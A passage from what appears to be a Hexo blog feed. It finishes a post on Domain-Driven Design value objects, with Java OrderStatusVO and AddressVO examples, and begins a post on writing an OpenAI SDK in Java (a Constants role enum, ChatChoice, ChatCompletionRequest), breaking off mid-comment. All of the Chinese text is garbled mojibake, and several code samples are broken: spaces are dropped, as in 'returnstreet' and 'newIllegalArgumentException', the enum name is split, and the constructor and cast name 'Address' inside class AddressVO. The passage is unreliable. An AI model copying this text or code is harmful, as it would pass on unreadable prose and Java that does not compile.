title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h4><p>å€¼å¯¹è±¡æ˜¯ç”±ä¸€ç»„å±æ€§ç»„æˆçš„ï¼Œå®ƒä»¬å…±åŒæè¿°äº†ä¸€ä¸ªé¢†åŸŸæ¦‚å¿µã€‚ä¸å®ä½“ï¼ˆEntityï¼‰ä¸åŒï¼Œå€¼å¯¹è±¡ä¸éœ€è¦æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦æ¥åŒºåˆ†å®ƒä»¬ã€‚å€¼å¯¹è±¡é€šå¸¸æ˜¯ä¸å¯å˜çš„ï¼Œè¿™æ„å‘³ç€ä¸€æ—¦åˆ›å»ºï¼Œå®ƒä»¬çš„çŠ¶æ€å°±ä¸åº”è¯¥æ”¹å˜ã€‚</p><h4 id="ç‰¹æ€§-2"><a href="#ç‰¹æ€§-2" class="headerlink" title="ç‰¹æ€§"></a>ç‰¹æ€§</h4><ol><li><strong>ä¸å¯å˜æ€§ï¼ˆImmutabilityï¼‰</strong>ï¼šå€¼å¯¹è±¡ä¸€æ—¦è¢«åˆ›å»ºï¼Œå®ƒçš„çŠ¶æ€å°±ä¸åº”è¯¥å‘ç”Ÿå˜åŒ–ã€‚è¿™æœ‰åŠ©äºä¿è¯é¢†åŸŸæ¨¡å‹çš„ä¸€è‡´æ€§å’Œçº¿ç¨‹å®‰å…¨æ€§ã€‚</li><li><strong>ç­‰ä»·æ€§ï¼ˆEqualityï¼‰</strong>ï¼šå€¼å¯¹è±¡çš„ç­‰ä»·æ€§ä¸æ˜¯åŸºäºèº«ä»½æˆ–å¼•ç”¨ï¼Œè€Œæ˜¯åŸºäºå¯¹è±¡çš„å±æ€§å€¼ã€‚å¦‚æœä¸¤ä¸ªå€¼å¯¹è±¡çš„æ‰€æœ‰å±æ€§å€¼éƒ½ç›¸ç­‰ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªå¯¹è±¡å°±è¢«è®¤ä¸ºæ˜¯ç­‰ä»·çš„ã€‚</li><li><strong>æ›¿æ¢æ€§ï¼ˆReplaceabilityï¼‰</strong>ï¼šç”±äºå€¼å¯¹è±¡æ˜¯ä¸å¯å˜çš„ï¼Œä»»ä½•éœ€è¦æ”¹å˜å€¼å¯¹è±¡çš„æ“ä½œéƒ½ä¼šå¯¼è‡´åˆ›å»ºä¸€ä¸ªæ–°çš„å€¼å¯¹è±¡å®ä¾‹ï¼Œè€Œä¸æ˜¯ä¿®æ”¹ç°æœ‰çš„å®ä¾‹ã€‚</li><li><strong>ä¾§é‡äºæè¿°äº‹ç‰©çš„çŠ¶æ€</strong>ï¼šå€¼å¯¹è±¡é€šå¸¸ç”¨æ¥æè¿°äº‹ç‰©çš„çŠ¶æ€ï¼Œè€Œä¸æ˜¯äº‹ç‰©çš„å”¯ä¸€èº«ä»½ã€‚</li><li><strong>å¯å¤ç”¨æ€§ï¼ˆReusabilityï¼‰</strong>ï¼šå€¼å¯¹è±¡å¯ä»¥åœ¨ä¸åŒçš„é¢†åŸŸå®ä½“æˆ–å…¶ä»–å€¼å¯¹è±¡ä¸­é‡å¤ä½¿ç”¨ã€‚</li></ol><h4 id="ç”¨é€”-2"><a href="#ç”¨é€”-2" class="headerlink" title="ç”¨é€”"></a>ç”¨é€”</h4><p>å€¼å¯¹è±¡çš„ç”¨é€”éå¸¸å¹¿æ³›ï¼Œå®ƒä»¬å¯ä»¥ç”¨æ¥è¡¨ç¤ºï¼š</p><p>é‡‘é¢å’Œè´§å¸ï¼ˆå¦‚ä»·æ ¼ã€å·¥èµ„ã€è´¹ç”¨ç­‰ï¼‰<br>åº¦é‡å’Œæ•°æ®ï¼ˆå¦‚é‡é‡ã€é•¿åº¦ã€ä½“ç§¯ç­‰ï¼‰<br>èŒƒå›´æˆ–åŒºé—´ï¼ˆå¦‚æ—¥æœŸèŒƒå›´ã€æ¸©åº¦åŒºé—´ç­‰ï¼‰<br>å¤æ‚çš„æ•°å­¦æ¨¡å‹ï¼ˆå¦‚åæ ‡ã€å‘é‡ç­‰ï¼‰<br>ä»»ä½•å…¶ä»–éœ€è¦å°è£…çš„å±æ€§é›†åˆ</p><h4 id="å®ç°æ‰‹æ®µ-3"><a href="#å®ç°æ‰‹æ®µ-3" class="headerlink" title="å®ç°æ‰‹æ®µ"></a>å®ç°æ‰‹æ®µ</h4><p>åœ¨å®ç°å€¼å¯¹è±¡æ—¶ï¼Œé€šå¸¸ä¼šéµå¾ªä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><p>å®šä¹‰ä¸å¯å˜ç±»ï¼šç¡®ä¿ç±»çš„æ‰€æœ‰å±æ€§éƒ½æ˜¯ç§æœ‰çš„ï¼Œå¹¶ä¸”åªèƒ½é€šè¿‡æ„é€ å‡½æ•°æ¥è®¾ç½®ã€‚<br>é‡å†™equalså’ŒhashCodeæ–¹æ³•ï¼šè¿™æ ·å¯ä»¥ç¡®ä¿å€¼å¯¹è±¡çš„ç­‰ä»·æ€§æ˜¯åŸºäºå®ƒä»¬çš„å±æ€§å€¼ï¼Œè€Œä¸æ˜¯å¯¹è±¡çš„å¼•ç”¨ã€‚<br>æä¾›åªè¯»è®¿é—®å™¨ï¼šåªæä¾›è·å–å±æ€§å€¼çš„æ–¹æ³•ï¼Œä¸æä¾›ä¿®æ”¹å±æ€§å€¼çš„æ–¹æ³•ã€‚<br>ä½¿ç”¨å·¥å‚æ–¹æ³•æˆ–æ„é€ å‡½æ•°åˆ›å»ºå®ä¾‹ï¼šè¿™æœ‰åŠ©äºç¡®ä¿å€¼å¯¹è±¡çš„æœ‰æ•ˆæ€§å’Œä¸€è‡´æ€§ã€‚<br>è€ƒè™‘åºåˆ—åŒ–æ”¯æŒï¼šå¦‚æœå€¼å¯¹è±¡éœ€è¦åœ¨ç½‘ç»œä¸Šä¼ è¾“æˆ–å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ï¼Œéœ€è¦æä¾›åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ”¯æŒã€‚</p><h4 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><p>ä»¥è®¢å•çŠ¶æ€ä¸ºä¾‹ï¼Œå¯ä»¥å®šä¹‰ä¸€ä¸ªå€¼å¯¹è±¡æ¥è¡¨ç¤ºä¸åŒçš„çŠ¶æ€ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Order</span> StatusVO&#123;</span><br><span class="line">    PLACED(<span class="number">0</span>,<span class="string">&quot;ä¸‹å•&quot;</span>),</span><br><span class="line">    PAID(<span class="number">1</span>,<span class="string">&quot;æ”¯ä»˜&quot;</span>),</span><br><span class="line">    COMPLETED(<span class="number">2</span>,<span class="string">&quot;å®Œæˆ&quot;</span>),</span><br><span class="line">    CANCELLED(<span class="number">3</span>,<span class="string">&quot;é€€å•&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String description;</span><br><span class="line"></span><br><span class="line">OrderStatusVO(intcode,String description)&#123;</span><br><span class="line">    <span class="built_in">this</span>.code = code;</span><br><span class="line">    <span class="built_in">this</span>.description = description;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> code;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getDescription</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> description;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ ¹æ®codeè·å–å¯¹åº”çš„OrderStatus</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title function_">OrderStatusVOfromCode</span><span class="params">(<span class="type">int</span> code)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(OrderStatusVO status:OrderStatusVO.values())&#123;</span><br><span class="line">        <span class="keyword">if</span>(status.getCode()==code)&#123;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">throw</span> newIllegalArgumentException(<span class="string">&quot;Invalid code for OrderStatus:&quot;</span>+code);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒOrderStatusVOæ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹çš„å€¼å¯¹è±¡ï¼Œå®ƒå°è£…äº†è®¢å•çŠ¶æ€çš„ä»£ç å’Œæè¿°ã€‚å®ƒæ˜¯ä¸å¯å˜çš„ï¼Œå¹¶ä¸”æä¾›äº†åŸºäºå±æ€§å€¼çš„ç­‰ä»·æ€§ã€‚é€šè¿‡å®šä¹‰ä¸€ä¸ªæšä¸¾ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿è®¢å•çŠ¶æ€çš„å€¼æ˜¯å—é™çš„ï¼Œå¹¶ä¸”æ¯ä¸ªçŠ¶æ€éƒ½æœ‰ä¸€ä¸ªæ˜ç¡®çš„å«ä¹‰ã€‚</p><p>åœ¨æ•°æ®åº“ä¸­ï¼Œè®¢å•çŠ¶æ€å¯èƒ½ä¼šä»¥æ•´æ•°å½¢å¼å­˜å‚¨ï¼ˆä¾‹å¦‚ï¼Œ0è¡¨ç¤ºä¸‹å•ï¼Œ1è¡¨ç¤ºæ”¯ä»˜ç­‰ï¼‰ã€‚åœ¨åº”ç”¨ç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨OrderStatusVOæšä¸¾æ¥ç¡®ä¿æˆ‘ä»¬åœ¨ä»£ç ä¸­ä½¿ç”¨çš„æ˜¯ç±»å‹å®‰å…¨çš„å€¼ï¼Œè€Œä¸æ˜¯è£¸éœ²çš„æ•´æ•°ã€‚è¿™æ ·å¯ä»¥å‡å°‘é”™è¯¯ï¼Œå¹¶æé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚</p><p>å½“éœ€è¦å°†è®¢å•çŠ¶æ€å­˜å‚¨åˆ°æ•°æ®åº“ä¸­æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å­˜å‚¨æšä¸¾çš„codeå€¼ã€‚å½“ä»æ•°æ®åº“ä¸­è¯»å–è®¢å•çŠ¶æ€æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨fromCodeæ–¹æ³•æ¥å°†æ•´æ•°å€¼è½¬æ¢å›OrderStatusVOæšä¸¾ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨ä»£ç ä¸­ä½¿ç”¨ä¸°å¯Œçš„æšä¸¾ç±»å‹è€Œä¸æ˜¯ç®€å•çš„æ•´æ•°ã€‚</p><p>å€¼å¯¹è±¡ä¹Ÿå¯ä»¥ç”¨æ¥è¡¨ç¤ºæ›´å¤æ‚çš„ç»“æ„ï¼Œæ¯”å¦‚ä¸€ä¸ªåœ°å€ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> classAddressVO&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Stringstreet;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Stringcity;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringzipCode;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Stringcountry;</span><br><span class="line"></span><br><span class="line">    publicAddress(Stringstreet,Stringcity,StringzipCode,Stringcountry)&#123;</span><br><span class="line">        <span class="comment">//è¿™é‡Œå¯ä»¥æ·»åŠ éªŒè¯é€»è¾‘ä»¥ç¡®ä¿åœ°å€çš„æœ‰æ•ˆæ€§</span></span><br><span class="line">        <span class="built_in">this</span>.street=street;</span><br><span class="line">        <span class="built_in">this</span>.city=city;</span><br><span class="line">        <span class="built_in">this</span>.zipCode=zipCode;</span><br><span class="line">        <span class="built_in">this</span>.country=country;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//åªè¯»è®¿é—®å™¨</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getStreet</span><span class="params">()</span>&#123;</span><br><span class="line">        returnstreet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCity</span><span class="params">()</span>&#123;</span><br><span class="line">        returncity;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getZipCode</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> zipCode;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCountry</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> country;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//é‡å†™equalså’ŒhashCodeæ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Objecto)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>==o)returntrue;</span><br><span class="line">        <span class="keyword">if</span>(o==<span class="literal">null</span>||getClass()!=o.getClass())returnfalse;</span><br><span class="line">        Address address=(Address)o;</span><br><span class="line">        <span class="keyword">return</span> street.equals(address.street)&amp;&amp;</span><br><span class="line">        city.equals(address.city)&amp;&amp;</span><br><span class="line">        zipCode.equals(address.zipCode)&amp;&amp;</span><br><span class="line">        country.equals(address.country);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hash(street,city,zipCode,country);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒAddressVOæ˜¯ä¸€ä¸ªä¸å¯å˜çš„å€¼å¯¹è±¡ï¼Œå®ƒå°è£…äº†ä¸€ä¸ªåœ°å€çš„æ‰€æœ‰éƒ¨åˆ†ã€‚å®ƒæä¾›äº†åªè¯»è®¿é—®å™¨ï¼Œå¹¶ä¸”é‡å†™äº†equalså’ŒhashCodeæ–¹æ³•ä»¥ç¡®ä¿åŸºäºå±æ€§å€¼çš„ç­‰ä»·æ€§ã€‚è¿™æ ·çš„è®¾è®¡æœ‰åŠ©äºç¡®ä¿åœ°å€çš„ä¸€è‡´æ€§ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä¸åŒçš„å®ä½“ä¹‹é—´é‡å¤ä½¿ç”¨ï¼Œä¾‹å¦‚ç”¨æˆ·å’Œå•†åº—éƒ½å¯èƒ½æœ‰åœ°å€ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œå€¼å¯¹è±¡æ˜¯DDDä¸­ç”¨äºå°è£…é¢†åŸŸæ¦‚å¿µçš„é‡è¦å·¥å…·ï¼Œå®ƒä»¬é€šè¿‡æä¾›ä¸å¯å˜æ€§ã€åŸºäºå±æ€§çš„ç­‰ä»·æ€§å’Œæ›¿æ¢æ€§æ¥å¸®åŠ©æ„å»ºä¸€ä¸ªæ¸…æ™°ã€ä¸€è‡´å’Œå¯ç»´æŠ¤çš„é¢†åŸŸæ¨¡å‹ã€‚</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://bugstack.cn/" style="color: #177cb0; text-decoration: underline;text-decoration-style: dotted;">å°å‚…å“¥ bugstack è™«æ´æ ˆ</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DDD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenAI SDKå¼€å‘(1)</title>
      <link href="/2023/12/03/2023-12-3-OpenAI-SDK%E5%BC%80%E5%8F%91-1/"/>
      <url>/2023/12/03/2023-12-3-OpenAI-SDK%E5%BC%80%E5%8F%91-1/</url>
      
        <content type="html"><![CDATA[<h2 id="OpenAI-SDKå¼€å‘-1"><a href="#OpenAI-SDKå¼€å‘-1" class="headerlink" title="OpenAI SDKå¼€å‘(1)"></a>OpenAI SDKå¼€å‘(1)</h2><p>æœ¬æ¬¡å®Œæˆçš„æ˜¯åŸºæœ¬æ¡†æ¶çš„æ­å»º,é¡¹ç›®ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤º:</p><p><img src="https://pb01.s3.bitiful.net/36.png" alt="avatar"></p><h3 id="common"><a href="#common" class="headerlink" title="common"></a>common</h3><h5 id="Constants"><a href="#Constants" class="headerlink" title="Constants"></a>Constants</h5><p>commonåŒ…ä¸‹å®šä¹‰äº†Constantsç±»,é‡Œé¢æš‚æ—¶å†™äº†ä¸€ä¸ªæšä¸¾å¯¹è±¡Role,æ˜¯è¦ç”¨åœ¨Messageä¸­çš„ä¸€ä¸ªå‚æ•°,è€ŒMessageåœ¨Requestå’ŒResponseä¸­éƒ½æœ‰,æ‰€ä»¥æ”¾åœ¨commonåŒ…ä¸‹,åé¢ä¼šç”¨åˆ°.</p><p><img src="https://pb01.s3.bitiful.net/37.png" alt="avatar"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Constants</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å®˜ç½‘æ”¯æŒçš„è¯·æ±‚è§’è‰²ç±»å‹ï¼›systemã€userã€assistant</span></span><br><span class="line"><span class="comment">     * https://platform.openai.com/docs/guides/chat/introduction</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Role</span> &#123;</span><br><span class="line"></span><br><span class="line">        SYSTEM(<span class="string">&quot;system&quot;</span>),</span><br><span class="line">        USER(<span class="string">&quot;user&quot;</span>),</span><br><span class="line">        ASSISTANT(<span class="string">&quot;assistant&quot;</span>),</span><br><span class="line">        ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String code;</span><br><span class="line"></span><br><span class="line">        Role(String code) &#123;</span><br><span class="line">            <span class="built_in">this</span>.code = code;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getCode</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> code;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="domain"><a href="#domain" class="headerlink" title="domain"></a>domain</h3><h4 id="chat-èŠå¤©æ¨¡å‹"><a href="#chat-èŠå¤©æ¨¡å‹" class="headerlink" title="chat(èŠå¤©æ¨¡å‹)"></a>chat(èŠå¤©æ¨¡å‹)</h4><h5 id="ChatChoice"><a href="#ChatChoice" class="headerlink" title="ChatChoice"></a>ChatChoice</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChatChoice</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> index;</span><br><span class="line">    <span class="meta">@JsonProperty(&quot;message&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Message message;</span><br><span class="line">    <span class="meta">@JsonProperty(&quot;finish_reason&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String finishReason;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢å®šä¹‰çš„æ˜¯choicesä¸­çš„å‡ ä¸ªå‚æ•°,choiceså‚æ•°æ˜¯åœ¨Responseä¸­çš„</p><p><img src="https://pb01.s3.bitiful.net/38.png" alt="avatar"></p><h5 id="ChatCompletionRequest-èŠå¤©å®Œæˆè¯·æ±‚"><a href="#ChatCompletionRequest-èŠå¤©å®Œæˆè¯·æ±‚" class="headerlink" title="ChatCompletionRequest(èŠå¤©å®Œæˆè¯·æ±‚)"></a>ChatCompletionRequest(èŠå¤©å®Œæˆè¯·æ±‚)</h5><p>æŠŠmodelå•ç‹¬å†™äº†ä¸€ä¸ªæšä¸¾ç±»,å®šä¹‰ç±»æ‰€éœ€å‚æ•°</p><p>è¿™äº›å‚æ•°é‡Œåªæœ‰modelå’Œmessageæ˜¯å¿…é¡»çš„,å…¶ä»–çš„éƒ½æ˜¯å¯é€‰çš„,æ‰€ä»¥ç”¨Builderæ¨¡å¼æ¥æ„å»ºå¯¹è±¡</p><p><img src="https://pb01.s3.bitiful.net/39.png" alt="avatar"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@JsonInclude(JsonInclude.Include.NON_NULL)</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChatCompletionRequest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** é»˜è®¤æ¨¡å‹ */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">model</span> <span class="operator">=</span> Model.GPT_3_5_TURBO.getCode();</span><br><span class="line">    <span class="comment">/** é—®é¢˜æè¿° */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Message&gt; messages;</span><br><span class="line">    <span class="comment">/** æ§åˆ¶æ¸©åº¦ã€éšæœºæ€§ã€‘ï¼›0åˆ°2ä¹‹é—´ã€‚è¾ƒé«˜çš„å€¼(å¦‚0.8)å°†ä½¿è¾“å‡ºæ›´åŠ éšæœºï¼Œè€Œè¾ƒä½çš„å€¼(å¦‚0.2)å°†ä½¿è¾“å‡ºæ›´åŠ é›†ä¸­å’Œç¡®å®š */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">temperature</span> <span class="operator">=</span> <span class="number">0.2</span>;</span><br><span class="line">    <span class="comment">/** å¤šæ ·æ€§æ§åˆ¶ï¼›ä½¿ç”¨æ¸©åº¦é‡‡æ ·çš„æ›¿ä»£æ–¹æ³•ç§°ä¸ºæ ¸å¿ƒé‡‡æ ·ï¼Œå…¶ä¸­æ¨¡å‹è€ƒè™‘å…·æœ‰top_pæ¦‚ç‡è´¨é‡çš„ä»¤ç‰Œçš„ç»“æœã€‚å› æ­¤ï¼Œ0.1 æ„å‘³ç€åªè€ƒè™‘åŒ…å«å‰ 10% æ¦‚ç‡è´¨é‡çš„ä»£å¸ */</span></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;top_p&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Double</span> <span class="variable">topP</span> <span class="operator">=</span> <span class="number">1d</span>;</span><br><span class="line">    <span class="comment">/** ä¸ºæ¯ä¸ªæç¤ºç”Ÿæˆçš„å®Œæˆæ¬¡æ•° */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/** æ˜¯å¦ä¸ºæµå¼è¾“å‡ºï¼›å°±æ˜¯ä¸€è¹¦ä¸€è¹¦çš„ï¼Œå‡ºæ¥ç»“æœ */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/** åœæ­¢è¾“å‡ºæ ‡è¯† */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; stop;</span><br><span class="line">    <span class="comment">/** è¾“å‡ºå­—ç¬¦ä¸²é™åˆ¶ï¼›0 ~ 4096 */</span></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;max_tokens&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Integer</span> <span class="variable">maxTokens</span> <span class="operator">=</span> <span class="number">2048</span>;</span><br><span class="line">    <span class="comment">/** é¢‘ç‡æƒ©ç½šï¼›é™ä½æ¨¡å‹é‡å¤åŒä¸€è¡Œçš„å¯èƒ½æ€§ */</span></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;frequency_penalty&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">frequencyPenalty</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/** å­˜åœ¨æƒ©ç½šï¼›å¢å¼ºæ¨¡å‹è°ˆè®ºæ–°è¯é¢˜çš„å¯èƒ½æ€§ */</span></span><br><span class="line">    <span class="meta">@JsonProperty(&quot;presence_penalty&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> <span class="variable">presencePenalty</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/** ç”Ÿæˆå¤šä¸ªè°ƒç”¨ç»“æœï¼Œåªæ˜¾ç¤ºæœ€ä½³çš„ã€‚è¿™æ 